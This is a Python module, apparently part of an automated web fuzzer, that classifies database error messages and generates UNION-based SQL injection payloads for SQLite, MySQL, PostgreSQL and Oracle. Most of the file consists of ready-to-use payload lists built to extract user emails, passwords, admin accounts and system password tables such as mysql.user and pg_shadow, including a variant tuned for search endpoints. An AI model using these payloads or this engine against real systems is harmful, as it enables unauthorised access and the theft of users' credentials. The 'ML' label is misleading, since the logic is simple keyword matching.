"""
ML Exploitation Engine
Analyzes error responses and generates working payloads for data extraction
"""

import re
import logging
import json
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass

logger = logging.getLogger(__name__)

@dataclass
class ExploitationResult:
    """Result of an exploitation attempt"""
    success: bool
    extracted_data: Optional[str]
    working_payload: Optional[str]
    exploitation_type: str
    confidence: float
    error_analysis: Dict[str, Any]
    suggestions: List[str]

class MLExploitationEngine:
    """ML-powered exploitation engine for vulnerability exploitation"""
    
    def __init__(self):
        self.error_patterns = {
            "sqlite_syntax": {
                "patterns": ["SQLITE_ERROR", "syntax error", "near"],
                "database_type": "sqlite",
                "exploitation_strategy": "sqlite_exploit"
            },
            "mysql_syntax": {
                "patterns": ["mysql", "MySQL", "syntax error"],
                "database_type": "mysql", 
                "exploitation_strategy": "mysql_exploit"
            },
            "postgresql_syntax": {
                "patterns": ["postgresql", "PostgreSQL", "psql"],
                "database_type": "postgresql",
                "exploitation_strategy": "postgresql_exploit"
            },
            "oracle_syntax": {
                "patterns": ["oracle", "Oracle", "ORA-"],
                "database_type": "oracle",
                "exploitation_strategy": "oracle_exploit"
            }
        }
        
        # Exploitation payload templates
        self.exploitation_payloads = {
            "sqlite_exploit": [
                # Basic information gathering
                "' UNION SELECT sqlite_version(),2,3,4,5,6,7,8,9,10--",
                "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
                "' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
                
                # User data extraction (common table names)
                "' UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users--",
                "' UNION SELECT id,username,password,4,5,6,7,8,9,10 FROM users--",
                "' UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM accounts--",
                "' UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM customers--",
                
                # Product data extraction
                "' UNION SELECT id,name,description,price,5,6,7,8,9,10 FROM Products--",
                "' UNION SELECT id,name,description,price,5,6,7,8,9,10 FROM products--",
                
                # Admin data
                "' UNION SELECT id,username,password,4,5,6,7,8,9,10 FROM admin--",
                "' UNION SELECT id,username,password,4,5,6,7,8,9,10 FROM administrators--",
                
                # Generic column discovery
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
            ],
            "mysql_exploit": [
                # Basic information
                "' UNION SELECT version(),user(),database(),4,5,6,7,8,9,10#",
                "' UNION SELECT @@version,@@hostname,@@datadir,4,5,6,7,8,9,10#",
                
                # Table discovery
                "' UNION SELECT table_name,2,3,4,5,6,7,8,9,10 FROM information_schema.tables#",
                "' UNION SELECT column_name,2,3,4,5,6,7,8,9,10 FROM information_schema.columns#",
                
                # User data extraction
                "' UNION SELECT user,password,3,4,5,6,7,8,9,10 FROM mysql.user#",
                "' UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM users#",
                "' UNION SELECT id,username,password,4,5,6,7,8,9,10 FROM accounts#",
                
                # Generic
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10#"
            ],
            "postgresql_exploit": [
                # Basic information
                "' UNION SELECT version(),current_user,current_database(),4,5,6,7,8,9,10--",
                "' UNION SELECT inet_server_addr(),inet_server_port(),3,4,5,6,7,8,9,10--",
                
                # Table discovery
                "' UNION SELECT tablename,2,3,4,5,6,7,8,9,10 FROM pg_tables--",
                "' UNION SELECT column_name,2,3,4,5,6,7,8,9,10 FROM information_schema.columns--",
                
                # User data extraction
                "' UNION SELECT usename,passwd,3,4,5,6,7,8,9,10 FROM pg_shadow--",
                "' UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM users--",
                
                # Generic
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
            ],
            "oracle_exploit": [
                # Basic information
                "' UNION SELECT banner,2,3,4,5,6,7,8,9,10 FROM v$version--",
                "' UNION SELECT user,2,3,4,5,6,7,8,9,10 FROM dual--",
                
                # Table discovery
                "' UNION SELECT table_name,2,3,4,5,6,7,8,9,10 FROM user_tables--",
                "' UNION SELECT column_name,2,3,4,5,6,7,8,9,10 FROM user_tab_columns--",
                
                # User data
                "' UNION SELECT username,password,3,4,5,6,7,8,9,10 FROM all_users--",
                
                # Generic
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM dual--"
            ]
        }
    
    def analyze_error_for_exploitation(self, error_response: str, original_payload: str, 
                                     endpoint_info: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze error response to determine exploitation strategy"""
        
        analysis = {
            "database_type": "unknown",
            "exploitation_strategy": "generic",
            "confidence": 0.0,
            "error_details": {},
            "suggestions": [],
            "evidence": [],
            "failure_reasons": []
        }
        
        error_lower = error_response.lower()
        
        # Detailed error analysis
        analysis["evidence"].append(f"Original payload: {original_payload}")
        analysis["evidence"].append(f"Error response length: {len(error_response)} characters")
        
        # Check for specific database errors
        database_detected = False
        for error_type, error_info in self.error_patterns.items():
            for pattern in error_info["patterns"]:
                if pattern.lower() in error_lower:
                    if not database_detected:
                        analysis["database_type"] = error_info["database_type"]
                        analysis["exploitation_strategy"] = error_info["exploitation_strategy"]
                        analysis["confidence"] += 0.4
                        database_detected = True
                        analysis["evidence"].append(f"‚úÖ Detected {error_info['database_type']} database from error pattern: '{pattern}'")
                    else:
                        analysis["confidence"] += 0.2
                        analysis["evidence"].append(f"‚ö†Ô∏è Additional {error_info['database_type']} pattern found: '{pattern}'")
        
        # Extract specific error details with more precision
        if "sqlite_error" in error_lower:
            analysis["database_type"] = "sqlite"
            analysis["exploitation_strategy"] = "sqlite_exploit"
            analysis["confidence"] = 0.9
            analysis["evidence"].append("‚úÖ Confirmed SQLite database from 'SQLITE_ERROR' in response")
        
        if "near" in error_lower:
            # Extract the problematic part
            near_match = re.search(r'near\s+["\']([^"\']+)["\']', error_response, re.IGNORECASE)
            if near_match:
                problematic_part = near_match.group(1)
                analysis["error_details"]["problematic_part"] = problematic_part
                analysis["evidence"].append(f"üîç Syntax error near: '{problematic_part}'")
                analysis["suggestions"].append(f"Fix syntax around '{problematic_part}'")
                
                # Specific suggestions based on problematic part
                if "union" in problematic_part.lower():
                    analysis["failure_reasons"].append("UNION statement syntax error")
                    analysis["suggestions"].append("Try different UNION syntax or column count")
                elif "select" in problematic_part.lower():
                    analysis["failure_reasons"].append("SELECT statement syntax error")
                    analysis["suggestions"].append("Check SELECT statement syntax")
        
        # Check for column count mismatch errors
        if "same number of result columns" in error_lower:
            analysis["error_details"]["column_mismatch"] = True
            analysis["evidence"].append("‚ùå UNION column count mismatch detected")
            analysis["failure_reasons"].append("UNION SELECT has different number of columns than original query")
            analysis["suggestions"].append("Match the exact column count of the original query")
            analysis["confidence"] += 0.2  # High confidence for this specific error
        
        if "syntax error" in error_lower:
            analysis["error_details"]["syntax_error"] = True
            analysis["evidence"].append("‚ùå SQL syntax error detected")
            analysis["failure_reasons"].append("SQL syntax is invalid for this database")
        
        if "union" in error_lower:
            analysis["error_details"]["union_issue"] = True
            analysis["evidence"].append("‚ö†Ô∏è UNION statement causing issues")
            analysis["failure_reasons"].append("UNION statement not compatible with current query structure")
        
        # Check for specific SQLite issues
        if analysis["database_type"] == "sqlite":
            if "#" in original_payload and "--" not in original_payload:
                analysis["failure_reasons"].append("Using MySQL comment syntax (#) instead of SQLite comment syntax (--)")
                analysis["suggestions"].append("Replace # comments with -- for SQLite")
                analysis["evidence"].append("üîß MySQL comment syntax detected in SQLite context")
        
        # Confidence adjustment based on evidence quality
        if len(analysis["evidence"]) > 2:
            analysis["confidence"] += 0.1
        if analysis["failure_reasons"]:
            analysis["confidence"] += 0.1
        
        # Normalize confidence
        analysis["confidence"] = min(1.0, analysis["confidence"])
        
        # Add summary
        if analysis["failure_reasons"]:
            analysis["suggestions"].append(f"Main issues: {', '.join(analysis['failure_reasons'])}")
        
        return analysis
    
    def generate_exploitation_payloads(self, error_analysis: Dict[str, Any], 
                                     original_payload: str, endpoint_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate exploitation payloads based on error analysis"""
        
        strategy = error_analysis.get("exploitation_strategy", "generic")
        database_type = error_analysis.get("database_type", "unknown")
        
        # Get base payloads for this strategy
        base_payloads = self.exploitation_payloads.get(strategy, [])
        
        # If no specific strategy, try generic approaches
        if not base_payloads:
            base_payloads = [
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' OR 1=1--",
                "' OR 'a'='a'--"
            ]
        
        # For SQLite, prioritize SQLite-specific payloads with correct structure
        if database_type == "sqlite":
            # Analyze the original payload to understand query structure
            original_payload = original_payload or ""
            endpoint_url = endpoint_info.get("url", "").lower()
            
            # Check if this is a search endpoint (common pattern)
            if "search" in endpoint_url:
                # For search endpoints, use the correct structure: qwert')) UNION SELECT ...
                base_payloads = [
                    # Correct structure for search endpoints (9 columns to match products)
                    "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--",
                    "qwert')) UNION SELECT id,username,password,'4','5','6','7','8','9' FROM users--",
                    "qwert')) UNION SELECT id,name,description,price,'5','6','7','8','9' FROM Products--",
                    "qwert')) UNION SELECT sqlite_version(),'2','3','4','5','6','7','8','9'--",
                    "qwert')) UNION SELECT name,'2','3','4','5','6','7','8','9' FROM sqlite_master WHERE type='table'--"
                ]
            else:
                # Generic SQLite payloads for other endpoints
                base_payloads = [
                    # Fix the comment syntax issue first
                    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                    # SQLite-specific information gathering
                    "' UNION SELECT sqlite_version(),2,3,4,5,6,7,8,9,10--",
                    "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
                    # User data extraction (common table names)
                    "' UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users--",
                    "' UNION SELECT id,username,password,4,5,6,7,8,9,10 FROM users--",
                    "' UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM accounts--",
                    # Product data extraction
                    "' UNION SELECT id,name,description,price,5,6,7,8,9,10 FROM Products--",
                    "' UNION SELECT id,name,description,price,5,6,7,8,9,10 FROM products--"
                ]
        
        exploitation_payloads = []
        
        for i, payload in enumerate(base_payloads):
            exploitation_payloads.append({
                "payload": payload,
                "exploitation_type": strategy,
                "database_type": database_type,
                "priority": i + 1,
                "description": self._get_payload_description(payload, strategy),
                "expected_result": self._get_expected_result(payload, strategy)
            })
        
        return exploitation_payloads
    
    def _get_payload_description(self, payload: str, strategy: str) -> str:
        """Get human-readable description of what the payload does"""
        descriptions = {
            "sqlite_exploit": {
                "sqlite_version": "Extract SQLite version information",
                "table_discovery": "Discover database tables",
                "user_extraction": "Extract user credentials",
                "product_extraction": "Extract product data",
                "generic": "Generic SQLite exploitation"
            },
            "mysql_exploit": {
                "version": "Extract MySQL version and system info",
                "table_discovery": "Discover database tables",
                "user_extraction": "Extract user credentials",
                "generic": "Generic MySQL exploitation"
            },
            "postgresql_exploit": {
                "version": "Extract PostgreSQL version and system info",
                "table_discovery": "Discover database tables", 
                "user_extraction": "Extract user credentials",
                "generic": "Generic PostgreSQL exploitation"
            }
        }
        
        # Simple heuristic to determine payload type
        if "version" in payload.lower():
            return descriptions.get(strategy, {}).get("version", "Extract version information")
        elif "table" in payload.lower() or "information_schema" in payload.lower():
            return descriptions.get(strategy, {}).get("table_discovery", "Discover database structure")
        elif "user" in payload.lower() or "password" in payload.lower():
            return descriptions.get(strategy, {}).get("user_extraction", "Extract user data")
        else:
            return descriptions.get(strategy, {}).get("generic", "Generic exploitation attempt")
    
    def _get_expected_result(self, payload: str, strategy: str) -> str:
        """Get expected result description"""
        if "version" in payload.lower():
            return "Database version information"
        elif "table" in payload.lower():
            return "List of database tables"
        elif "user" in payload.lower() or "password" in payload.lower():
            return "User credentials or account data"
        elif "product" in payload.lower():
            return "Product catalog data"
        else:
            return "Database data extraction"
    
    def exploit_vulnerability(self, endpoint: Dict[str, Any], original_payload: str, 
                            error_response: str) -> ExploitationResult:
        """Main exploitation method"""
        
        logger.info(f"üéØ Starting exploitation for {endpoint.get('url', '')}")
        
        # Analyze the error
        error_analysis = self.analyze_error_for_exploitation(error_response, original_payload, endpoint)
        
        logger.info(f"üîç Error analysis: {error_analysis['database_type']} (confidence: {error_analysis['confidence']:.2f})")
        
        # Generate exploitation payloads
        exploitation_payloads = self.generate_exploitation_payloads(error_analysis, original_payload, endpoint)
        
        logger.info(f"üß¨ Generated {len(exploitation_payloads)} exploitation payloads")
        
        # Return exploitation plan (actual execution would be done by the fuzzer)
        return ExploitationResult(
            success=True,
            extracted_data=None,  # Will be filled after execution
            working_payload=None,  # Will be filled after execution
            exploitation_type=error_analysis.get("exploitation_strategy", "generic"),
            confidence=error_analysis.get("confidence", 0.0),
            error_analysis=error_analysis,
            suggestions=error_analysis.get("suggestions", [])
        )

# Global instance
exploitation_engine = MLExploitationEngine()
